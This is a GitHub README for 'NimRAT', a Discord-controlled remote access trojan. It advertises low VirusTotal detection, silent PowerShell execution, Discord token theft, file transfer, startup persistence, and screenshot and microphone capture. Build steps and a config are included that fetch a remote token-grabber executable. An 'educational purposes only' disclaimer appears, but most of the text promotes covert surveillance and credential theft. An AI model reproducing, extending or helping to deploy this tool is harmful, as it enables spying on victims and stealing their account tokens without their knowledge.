
# NimRAT

A simple discord-based remote access tool using Nim and Go. Please leave a ⭐ if you have found this project useful :)

## Features

- Not Python
- Only 2 detections on VirusTotal for main payload and 1 detection on VirusTotal for token grabber
- 3-4mb payload
- No server needed - communication via discord bot
- Execute silent powershell commands
- Collect discord tokens
- Upload/Download files
- Add to startup
- Make screenshots and record microphone
- And more!

## Screenshots
![image](https://github.com/user-attachments/assets/ef953825-c79b-47a0-8480-791bf3d2450e)  
![image](https://github.com/user-attachments/assets/dee6df5f-8c90-406d-8484-7744fa664e72)  
![image](https://github.com/user-attachments/assets/0f5d1fe2-8dce-419c-8dea-e016beba9c25)  
![image](https://github.com/user-attachments/assets/27d60947-1ff0-4148-9046-3d46791da2bd)  
![image](https://github.com/user-attachments/assets/e6cf0365-5251-427e-8a5f-d6196d5090b9)

## Requirements

You should have Nim and Go installed. Nim for the main payload, Go for the discord tokens. If you don't want to compile the token grabber yourself, you can skip Go installation.

Download Nim - https://nim-lang.org/install.html

Download Go - https://go.dev/doc/install

## Installation and usage

Clone the GitHub repository

```bash
git clone https://github.com/WipingAllOut/NimRAT
cd NimRAT
```

Note: if you want to compile the token grabber yourself and not use the exe provided in this repository, follow these steps:

```bash
cd GoTokenGrabber
go build
```

Open modules/config.nim with any text editor and change values

```nim
let newUsersChannelId* = "" # You will be notified about new users in this channel
let tokenDecryptorUrl* = "https://github.com/WipingAllOut/NimRAT/raw/refs/heads/main/GoTokenGrabber/tokens.exe" # You can leave it as is or upload your token grabber 
let discordToken* = "" # Your discord bot token (https://discord.com/developers/applications)
```

Now launch `compile.bat` and select option 3. If no errors occur, your payload will be in the same folder, `program.exe`.

Important: make sure your discord bot has Message Content Intent enabled!

![image](https://github.com/user-attachments/assets/2fef6b25-b677-4620-a81b-bd763b135726)

To show the list of commands, type `.help`.

## TODO
- [x]  Get user's data from discord token (username, has nitro, etc)  
- [ ]  Get tdata

## Disclaimer

This project is for educational purposes only and aims to promote learning about cybersecurity and ethical hacking.

Prohibited Uses:

- Do not use this tool for illegal, unethical, or malicious activities.
- Use it only in controlled environments with proper authorization.

The author assumes no liability for misuse, damage, or legal issues resulting from this tool. By using this software, you agree to comply with all applicable laws and take full responsibility for your actions.
## Credits

https://github.com/Aaron2599/Discord-Token-Decrypt  
https://github.com/Peroxidelol/Discord-RAT
